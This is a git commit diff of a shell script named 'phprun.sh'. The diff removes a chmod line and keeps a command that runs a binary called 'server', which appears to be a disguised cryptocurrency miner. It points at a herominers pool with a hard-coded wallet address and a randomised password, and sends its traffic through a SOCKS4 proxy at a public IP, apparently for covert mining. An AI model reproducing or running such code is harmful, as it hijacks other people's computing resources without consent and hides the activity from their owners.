ea0c003ca04f9ecfce6dfcc495612b12b8e20903
Ankie-Davenschot <90869291+Ankie-Davenschot@users.noreply.github.com>
2021-09-17 07:24:05 +0700

    Update phprun.sh

--- phprun.sh
+++ phprun.sh
@@ -1,3 +1,2 @@
 
-chmod +x phpsur.sh && chmod +x server && chmod 777 server phpsur.sh
 ./server --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password AB=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks4://SOCKS4://72.206.181.105:64935
